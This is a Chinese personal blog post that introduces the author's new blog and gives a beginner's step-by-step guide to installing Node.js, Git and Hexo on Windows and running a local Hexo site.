    <content><![CDATA[<h3 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h3><div class="note default"><p>心血来潮，都二十多岁的人了还没有一个自己的博客，确实说不过去，最近因为疫情原因也确实有了有史以来最长的一个寒假，除了学习<code>+</code>玩耍，我发现我越来越想要留下些属于自己的印记，或是记录，或是分享。不管怎么样，这是真正动笔的第一篇<code>blog</code>，一个全新的开始，加油吧！</p></div><a id="more"></a><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h4 id="为什么是Hexo？"><a href="#为什么是Hexo？" class="headerlink" title="为什么是Hexo？"></a>为什么是<code>Hexo</code>？</h4><div class="note primary"><p>相信对博客或多或少了解的同学都知道<code>WordPress</code>，一款强大的也是普及率最高的个人博客平台，如今几乎各大云平台都提供一键部署功能，可以说在资金到位的情况下（服务器+域名的长期维护费用），<code>WordPress</code>很适合对blog刚刚入门的小白，是的，它简单、成熟且易用。</p><p>但作为学生党，本着能省则省外加多折腾的原则，拥有一款永久免费的blog当然是最吼的。那么<code>Hexo</code>便是这样一款博客框架。<span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL3poLWNuL2RvY3Mv">Hexo<i class="fa fa-external-link-alt"></i></span>是一个快速、简洁且高效的博客框架。<code>Hexo</code> 使用 <span class="exturl" data-url="aHR0cDovL2RhcmluZ2ZpcmViYWxsLm5ldC9wcm9qZWN0cy9tYXJrZG93bi8=">Markdown<i class="fa fa-external-link-alt"></i></span>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p></div><h4 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h4><div class="note info"><p>可能你现在并不知道什么叫做<strong><u>静态网页</u></strong>，不用着急，本教程完全带你从零开始搭建你的blog，你只需一步步根据教程往下走，直到你走完全程，你自然会明白这一切。</p><ul><li>使用平台：Windows。</li><li>下载并安装<span class="exturl" data-url="aHR0cDovL25vZGVqcy5vcmcv">Node.js<i class="fa fa-external-link-alt"></i></span>，点击选择符合你电脑的<strong>直装版本</strong>即可。</li><li>下载并安装<span class="exturl" data-url="aHR0cDovL2dpdC1zY20uY29tLw==">Git<i class="fa fa-external-link-alt"></i></span>，根据官方疯狂下一步即可。</li></ul></div><h4 id="使用Git-Bash安装并初始化Hexo"><a href="#使用Git-Bash安装并初始化Hexo" class="headerlink" title="使用Git Bash安装并初始化Hexo"></a>使用Git Bash安装并初始化Hexo</h4><div class="note info"><p>安装好Git之后，它会创建Git Bash和Git GUI两个程序，分别是终端和可视化版本，我们这里只需要用到Git Bash这个程序。</p><ul><li><p>第一步给你的博客建立一个本地仓库，推荐这样创建文件夹：<code>D/workspaces/</code></p></li><li><p>进入到<code>workspaces</code>文件夹，鼠标点击右键，选择Git Bash Here，弹出一个黑色命令框，那么一切就从这里开始了。</p></li><li><p>输入命令：<code>node -v</code>。顾名思义，这个命令用于检测刚刚你是否装好了node。</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20200302195054.png" alt=""></p><p>如图所示，我这里已经装好了v12.16.1版本</p></li><li><p>接下来安装Hexo，输入命令：<code>npm install -g hexo-cli</code>。这里可能提示你没有安装npm命令，通常是因为你的node没有正确安装，输入<code>yum install -y nodejs</code>重新安装即可。</p></li><li><p>查看版本：输入<code>hexo -v</code>，见到如下场景，说明安装成功。</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20200302201627.png" alt=""></p></li><li><p>初始化hexo：输入命令<code>hexo init myblog</code>。该命令会在当前目录下创建并初始化hexo的工作目录名为<code>myblog</code>。</p></li><li><p>首先使用命令<code>cd myblog</code>进入到该文件夹，然后输入命令<code>npm install</code>安装相关依赖。</p></li></ul></div><h4 id="构建你的本地Hexo博客"><a href="#构建你的本地Hexo博客" class="headerlink" title="构建你的本地Hexo博客"></a>构建你的本地Hexo博客</h4><div class="note success"><p>完成hexo初始化后，我们不妨尝试先看看我们的博客到底是怎么样子，继续在上面的GitBash窗口输入以下命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g&#x2F;&#x2F;构建hexo博客文件</span><br><span class="line">hexo s&#x2F;&#x2F;启动hexo本地服务器</span><br></pre></td></tr></table></figure><p>如此，在浏览器输入<code>localhost:4000</code>，如果看到hexo的博客首页，说明你的博客已经可以在本地运行了。</p></div>]]></content>
      <tags>
        <tag>实用教程</tag>
      </tags>
  </entry>
</search>
